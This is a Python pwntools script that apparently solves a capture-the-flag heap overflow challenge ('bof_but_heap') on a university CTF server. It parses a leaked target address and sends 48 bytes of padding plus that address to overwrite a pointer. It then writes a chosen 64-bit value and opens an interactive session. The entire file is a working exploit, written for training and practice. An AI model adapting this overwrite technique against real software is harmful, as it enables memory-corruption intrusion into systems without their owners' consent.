from pwn import *

# p = process('./bof_but_heap')
p = remote('ctf99.cs.ui.ac.id', 9133)

target_value = 0x00001a2b3c4d5e6f
target_address = 0x404080

# p.sendlineafter('berapa data? ', '2')
# p.sendlineafter('(max 32 characters):', '1')
print(p.recvline())
print(p.recvuntil('Target terletak di '))
target_address = int(p.recvline().strip(), 16)
# print(hex(target_value))
print(p.recvline())
p.sendline('2')
print(p.recvline())

payload = 'A'*48 + p32(target_address) 

p.sendline(payload)
print(p.recvline())

payload = p64(target_value)
p.sendline(payload)
# print(p.recvline())
p.interactive()
